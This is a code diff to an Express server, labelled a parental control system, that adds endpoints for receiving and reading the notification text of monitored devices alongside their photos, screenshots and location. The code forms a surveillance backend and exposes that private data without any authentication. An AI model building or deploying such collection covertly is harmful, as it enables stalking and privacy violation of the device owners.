@@ -25,6 +25,9 @@ let deviceLocations = {};
 // ✅ NEW: Track gallery changes
 let galleryChanges = {};
 
+// ✅ NEW: Store notifications
+let deviceNotifications = {};
+
 // ✅ TIME FORMATTING FUNCTION
 function formatTimestamp(timestamp) {
     try {
@@ -118,6 +121,275 @@ const upload = multer({
     storage: storage,
     limits: {
         fileSize: 10 * 1024 * 1024 // 10MB limit
+    }
+});
+
+// ✅ NEW: Notification update route
+app.post('/api/notification-update', (req, res) => {
+    try {
+        const { 
+            deviceId, 
+            deviceName,
+            packageName,
+            appName,
+            title,
+            text,
+            timestamp,
+            category,
+            priority
+        } = req.body;
+        
+        console.log('📢 Notification received:', { 
+            deviceId, 
+            appName,
+            title: title ? title.substring(0, 50) + '...' : 'No Title'
+        });
+        
+        if (!deviceId) {
+            return res.status(400).json({ 
+                success: false,
+                error: 'Device ID is required' 
+            });
+        }
+
+        if (!title && !text) {
+            return res.status(400).json({ 
+                success: false,
+                error: 'Notification title or text is required' 
+            });
+        }
+
+        // Initialize notifications for device if not exists
+        if (!deviceNotifications[deviceId]) {
+            deviceNotifications[deviceId] = [];
+        }
+
+        const notificationData = {
+            id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
+            packageName: packageName || 'unknown',
+            appName: appName || 'Unknown App',
+            title: title || '',
+            text: text || '',
+            timestamp: timestamp || Date.now(),
+            formattedTime: formatSimpleTime(timestamp || Date.now()),
+            category: category || 'general',
+            priority: priority || 'normal',
+            receivedAt: new Date().toLocaleTimeString()
+        };
+
+        // Add to device notifications (keep last 200 notifications)
+        deviceNotifications[deviceId].unshift(notificationData); // Latest first
+        if (deviceNotifications[deviceId].length > 200) {
+            deviceNotifications[deviceId] = deviceNotifications[deviceId].slice(0, 200);
+        }
+
+        // Update device info
+        let device = connectedDevices.find(d => d.id === deviceId);
+        if (device) {
+            device.lastNotification = notificationData;
+            device.lastConnected = formatSimpleTime(Date.now());
+            device.status = 'online';
+            device.notificationCount = deviceNotifications[deviceId].length;
+        }
+
+        console.log('✅ Notification stored for device:', deviceId, '| Total:', deviceNotifications[deviceId].length);
+
+        res.json({ 
+            success: true,
+            message: 'Notification received successfully',
+            deviceId: deviceId,
+            notification: notificationData,
+            totalNotifications: deviceNotifications[deviceId].length
+        });
+        
+    } catch (error) {
+        console.error('❌ Notification update error:', error);
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
+    }
+});
+
+// ✅ NEW: Get notifications for device
+app.get('/api/notifications/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const { limit = 50, app = 'all' } = req.query;
+        
+        console.log('📢 Notifications request for device:', deviceId);
+
+        if (!deviceNotifications[deviceId] || deviceNotifications[deviceId].length === 0) {
+            return res.json({ 
+                success: true,
+                message: 'No notifications found',
+                deviceId: deviceId,
+                notifications: []
+            });
+        }
+
+        let notifications = deviceNotifications[deviceId];
+
+        // Filter by app if specified
+        if (app !== 'all') {
+            notifications = notifications.filter(notif => 
+                notif.packageName.includes(app) || notif.appName.toLowerCase().includes(app.toLowerCase())
+            );
+        }
+
+        // Apply limit
+        notifications = notifications.slice(0, parseInt(limit));
+
+        res.json({ 
+            success: true,
+            deviceId: deviceId,
+            notifications: notifications,
+            totalNotifications: deviceNotifications[deviceId].length,
+            showing: notifications.length
+        });
+        
+    } catch (error) {
+        console.error('❌ Notifications fetch error:', error);
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
+    }
+});
+
+// ✅ NEW: Get notification statistics
+app.get('/api/notification-stats/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        
+        if (!deviceNotifications[deviceId] || deviceNotifications[deviceId].length === 0) {
+            return res.json({ 
+                success: true,
+                message: 'No notifications found',
+                deviceId: deviceId,
+                stats: {
+                    total: 0,
+                    byApp: {},
+                    todayCount: 0,
+                    mostActiveApp: 'None'
+                }
+            });
+        }
+
+        const notifications = deviceNotifications[deviceId];
+        const today = new Date().toDateString();
+        
+        // Count by app
+        const appCounts = {};
+        let todayCount = 0;
+
+        notifications.forEach(notif => {
+            // Count by app
+            const appKey = notif.appName;
+            appCounts[appKey] = (appCounts[appKey] || 0) + 1;
+
+            // Count today's notifications
+            const notifDate = new Date(notif.timestamp).toDateString();
+            if (notifDate === today) {
+                todayCount++;
+            }
+        });
+
+        // Find most active app
+        let mostActiveApp = 'None';
+        let maxCount = 0;
+        for (const [app, count] of Object.entries(appCounts)) {
+            if (count > maxCount) {
+                maxCount = count;
+                mostActiveApp = app;
+            }
+        }
+
+        res.json({ 
+            success: true,
+            deviceId: deviceId,
+            stats: {
+                total: notifications.length,
+                byApp: appCounts,
+                todayCount: todayCount,
+                mostActiveApp: mostActiveApp,
+                lastNotification: notifications[0]?.formattedTime || 'None'
+            }
+        });
+        
+    } catch (error) {
+        console.error('❌ Notification stats error:', error);
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
+    }
+});
+
+// ✅ NEW: Clear notifications for device
+app.delete('/api/clear-notifications/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        
+        console.log('🗑️ Clear notifications request for device:', deviceId);
+
+        const notificationCount = deviceNotifications[deviceId] ? deviceNotifications[deviceId].length : 0;
+        delete deviceNotifications[deviceId];
+
+        console.log('✅ Notifications cleared for device:', deviceId);
+
+        res.json({ 
+            success: true,
+            message: 'Notifications cleared successfully',
+            deviceId: deviceId,
+            deletedNotifications: notificationCount
+        });
+        
+    } catch (error) {
+        console.error('❌ Clear notifications error:', error);
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
+    }
+});
+
+// ✅ NEW: Get apps list for device
+app.get('/api/notification-apps/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        
+        if (!deviceNotifications[deviceId] || deviceNotifications[deviceId].length === 0) {
+            return res.json({ 
+                success: true,
+                message: 'No notifications found',
+                deviceId: deviceId,
+                apps: []
+            });
+        }
+
+        const appSet = new Set();
+        deviceNotifications[deviceId].forEach(notif => {
+            if (notif.appName && notif.appName !== 'Unknown App') {
+                appSet.add(notif.appName);
+            }
+        });
+
+        const apps = Array.from(appSet).sort();
+
+        res.json({ 
+            success: true,
+            deviceId: deviceId,
+            apps: apps,
+            totalApps: apps.length
+        });
+        
+    } catch (error) {
+        console.error('❌ Notification apps error:', error);
+        res.status(500).json({ 
+            success: false,
+            error: error.message 
+        });
     }
 });
 
@@ -694,6 +966,7 @@ app.get('/health', (req, res) => {
         deviceCount: connectedDevices.length,
         galleryDeviceCount: Object.keys(deviceGalleries).length,
         locationDeviceCount: Object.keys(deviceLocations).length,
+        notificationDeviceCount: Object.keys(deviceNotifications).length, // ✅ NEW
         changesDeviceCount: Object.keys(galleryChanges).length
     });
 });
@@ -804,14 +1077,19 @@ app.get('/api/devices', (req, res) => {
         const enhancedDevices = connectedDevices.map(device => {
             const locationCount = deviceLocations[device.id] ? deviceLocations[device.id].length : 0;
             const galleryCount = deviceGalleries[device.id] ? deviceGalleries[device.id].length : 0;
+            const notificationCount = deviceNotifications[device.id] ? deviceNotifications[device.id].length : 0; // ✅ NEW
             const lastLocation = deviceLocations[device.id] ? 
                 deviceLocations[device.id][deviceLocations[device.id].length - 1] : null;
+            const lastNotification = deviceNotifications[device.id] ? 
+                deviceNotifications[device.id][0] : null; // ✅ NEW
 
             return {
                 ...device,
                 locationCount: locationCount,
                 galleryCount: galleryCount,
-                lastLocation: lastLocation
+                notificationCount: notificationCount, // ✅ NEW
+                lastLocation: lastLocation,
+                lastNotification: lastNotification // ✅ NEW
             };
         });
 
@@ -841,6 +1119,7 @@ app.delete('/api/delete-device', (req, res) => {
         delete deviceGalleries[deviceId];
         delete deviceLocations[deviceId];
         delete galleryChanges[deviceId];
+        delete deviceNotifications[deviceId]; // ✅ NEW
         
         if (connectedDevices.length < initialLength) {
             console.log('✅ Device deleted successfully');
@@ -872,6 +1151,7 @@ app.delete('/api/clear', (req, res) => {
     deviceGalleries = {};
     deviceLocations = {};
     galleryChanges = {};
+    deviceNotifications = {}; // ✅ NEW
     
     console.log('🗑️ All devices and data cleared. Total cleared:', deviceCount);
     res.json({ 
@@ -890,9 +1170,14 @@ app.get('/', (req, res) => {
             register: '/api/register (POST)',
             batteryUpdate: '/api/battery-update (POST)',
             locationUpdate: '/api/location-update (POST)',
+            notificationUpdate: '/api/notification-update (POST)', // ✅ NEW
             getLocation: '/api/location/:deviceId (GET)',
             locationHistory: '/api/location-history/:deviceId (GET)',
+            getNotifications: '/api/notifications/:deviceId (GET)', // ✅ NEW
+            notificationStats: '/api/notification-stats/:deviceId (GET)', // ✅ NEW
+            notificationApps: '/api/notification-apps/:deviceId (GET)', // ✅ NEW
             clearLocation: '/api/clear-location/:deviceId (DELETE)',
+            clearNotifications: '/api/clear-notifications/:deviceId (DELETE)', // ✅ NEW
             devices: '/api/devices (GET)',
             uploadGallery: '/api/upload-gallery (POST)',
             uploadScreenshot: '/api/upload-screenshot (POST)',
@@ -908,9 +1193,10 @@ app.get('/', (req, res) => {
             deviceCount: connectedDevices.length,
             galleryDeviceCount: Object.keys(deviceGalleries).length,
             locationDeviceCount: Object.keys(deviceLocations).length,
+            notificationDeviceCount: Object.keys(deviceNotifications).length, // ✅ NEW
             changesDeviceCount: Object.keys(galleryChanges).length
         },
-        note: '✅ Complete System with Battery + Gallery + Location Tracking!',
+        note: '✅ Complete System with Battery + Gallery + Location + Notifications Tracking!',
         timeFormat: '📅 Time now displayed as: "25 Nov 2024 02:45:35 PM"'
     });
 });
@@ -919,7 +1205,7 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
     console.log('🚀 Parental Control Server Started! - COMPLETE SYSTEM');
     console.log(`📍 Port: ${PORT}`);
-    console.log('📸 Features: Battery + Gallery + Screenshots + Location Tracking');
+    console.log('📸 Features: Battery + Gallery + Screenshots + Location + Notifications 📢');
     console.log('🕐 Time Format: 25 Nov 2024 02:45:35 PM');
     console.log('✅ All systems ready!');
 });
